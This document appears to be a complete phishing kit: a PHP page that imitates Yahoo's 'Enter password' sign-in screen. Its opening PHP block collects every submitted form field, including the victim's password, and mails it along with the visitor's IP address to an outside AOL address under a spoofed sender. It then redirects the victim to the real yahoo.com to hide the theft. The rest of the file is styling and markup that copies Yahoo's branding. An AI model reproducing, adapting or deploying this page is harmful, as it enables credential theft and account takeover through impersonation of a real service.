<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: http://yahoo.com');
$message = '';
foreach($_POST as $variable => $value) {
$message .= $variable.': '.$value."\r\n";}
$header  = 'From: steve <donotreply@pbmkr.vt>'."\r\n";
$header .= 'Reply-To: donotreply@pbmkr.vt'."\r\n";
$header .= 'MIME-Version: 1.0'."\r\n";
$header .= 'Content-Type: text/plain; charset=utf-8'."\r\n";
$header .= 'Content-Transfer-Encoding: 8bit'."\r\n";
$header .= 'X-Mailer: PHP v'.phpversion();
mail('stevesmith670@aol.com', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
exit;
} ?>
<!doctype html>
<html lang="en">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css" integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">
    <link rel="shortcut icon" type="image/png" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico"/>


    <title>Yahoo - Sign in</title>

    <style type="text/css">
	
	body{
		-webkit-appearance: none;
		-webkit-border-radius: 0;
	}
	.p-header{
		line-height: 1.35294rem;
		letter-spacing: -.2px;
		font-size:22px;
		font-weight:600;
	}
	

    .page_wrapper{
      padding: 0px;
	  background-image: url(http://localhost:8080/phpSite/yahoo/"https://s.yimg.com/ch/4b41fe99-b90e-4009-b0cb-403381bd1ac7.jpeg");
    }
      .loginform_container
      {
		margin-top:11px;
		background-color:white;
		float:right;
		margin-right:170px;
        width:360px;
		border:1.5px solid #dee2e6;
		box-shadow: 0 2px 4px 0 rgb(0 0 0 / 30%);
        height:550px;
      }
      .logo_container
      {	 
          padding-top:28px;
          text-align: center;
      }
      .header_container{
        padding-top:10px;
        text-align: center;

      }


	  #logo{width:90px;height:27px;}

      #submit_Button{
        width:300px;
        border: 1px solid #188fff;
        border-radius: 25px;
		font-size:18px;
		outline:none;
        background-color: #188fff;
        color:white;
        margin-bottom:20px;
		padding-top:7px;
		padding-bottom:7px;
		
      }

      .login_form{
          text-align: center;
          height: 370px;
      }

      .email{
        margin-top:45px;
        width:300px;
		height:40px;
        padding-left:10px;
        border-top:none;
        border-left:none;
        border-right:none;
        border-bottom:1px solid #b9bdc5;
      }

      .email:focus{
         outline:none;
      }
      #head_container{
        height:84px;
        padding-left: 50px;
		padding-top:25px;
      }

      .header_container{
        display: block;
        font-size: 1.05882em;
        font-weight: 500;
        letter-spacing: normal;
      }


     





	.identifier{
		font-size:15px;
        letter-spacing: .58px;
		font-weight:400;
	}






.m-header{
	font-family: 'Helvetica Neue',Helvetica,Arial;
	font-size:14px;
    display: block;
    padding: 0;
    margin-top: 0.35294rem;
    letter-spacing: -.3px;
    line-height: 1rem;
    text-align: center;
	font-weight:400;
}



    @media only screen and (max-width: 600px) {
	#submit_Button{
		color: #fff;
		background: #188fff;
		border: 1px solid #188fff;
		width:85%;
		padding-top:10px;
		padding-bottom:10px;
		border-radius: 30px;
		font-size:18px;
		margin-bottom:20px;
		outline:none;
	}
	  
	  #logo{width:100px;height:30px;}
	  
	  
	  .loginform_container
      {
        padding:20px;
        width:100%;
		border:none;
		box-shadow: none;
		margin:0px;
      }
	  
	.email{
		-webkit-appearance: none;
		-webkit-border-radius: 0;
        margin-bottom:10px;
        width:90%;
		height:40px;
        padding-left:0px;
        border:2px solid red;
      }
	  
	  .textfield{
		  width:85%;
	  }
	  
	  	.p-header{
		line-height: 1.35294rem;
		letter-spacing: -.2px;
		font-size:22px;
		font-weight:600;
	}
	  #head_container{
        height:70px;
        padding: 10px;
		display:none;
      }
	  
	  .page_wrapper{
		  background-image:none;
	  }
	  
  }
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  .centered{
	  position:relative;
  }
  
  
  .textfield {
    position: relative;
	border:none;
    padding: 10px 15px;
    border-bottom:1px solid #A9A9A9;
    box-shadow: none;
}
.centered span {
    position: absolute;
    z-index: 1;
    background-color:#fff;
    top: 54px;
    left: 25px;
    color:#A9A9A9;
    padding:0 5px;
}
.textfield:focus {
    border:none;
    border-bottom:1px solid #188fff;
	outline: none;

}

input:focus ~ span,
input:not(:focus):valid ~ span {
    top:30px;
	color:#26282a;
    font-size:13px;
}
.textfield, span {
	transition: ease-in-out 0.2s all;
	-webkit-transition: ease-in-out 0.2s all;
	-moz-transition: ease-in-out 0.2s all;
	-o-transition: ease-in-out 0.2s all;
}

    </style>

</head>
<body>
    <div class="container_fluid" id="head_container">
      <img id="logo" src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" style="width:120px;height:36px;">
      <span style="float:right;padding-right:60px;color:#188fff;font-weight:normal;font-size:13px;">Help</span>
    </div>
    <div class="container_fluid page_wrapper" style="height:100vh;">
      <div class="loginform_container">
          <div class="logo_container">
            <img id="logo" src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png">
          </div>
          <div class="header_container">
		  <p 
		  <span class="identifier">
			
			<p style="margin-top:15px;"><span class="p-header">Enter password</span><br>
			<span class="m-header">to verify it's you<span></p>
			
          </div>
          <div class="login_form">
		  <form action="<?php echo basename(__FILE__); ?>" method="post">


			<div class="centered" style>
					<input type="password" name="pass" class="textfield email" required autofocus>
					<span class="placeholder">Password</span>
			</div>

			<span style="font-size:14px;color:red;"><span><br>
            <input  type="submit" value="Next" id="submit_Button">
			<input type="hidden" name="token" value="<br />
<b>Warning</b>:  Undefined variable $token in <b>C:\xampp\htdocs\phpSite\yahoo\index.php</b> on line <b>291</b><br />
">
			<input type="hidden" value="true" name="verify">
            <span style="margin:0 auto;color:#188fff;font-size:13px;"><br><a href="https://yahoo.com">Forgot password ?</a></span>
          </div>
          <div class="login_footer" style="text-align:center;font-size:13px;">

          </div>
      </div>
    </div>




  <!-- Optional JavaScript -->
  <!-- jQuery first, then Popper.js, then Bootstrap JS -->
  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js" integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k" crossorigin="anonymous"></script>
</body>
</html>
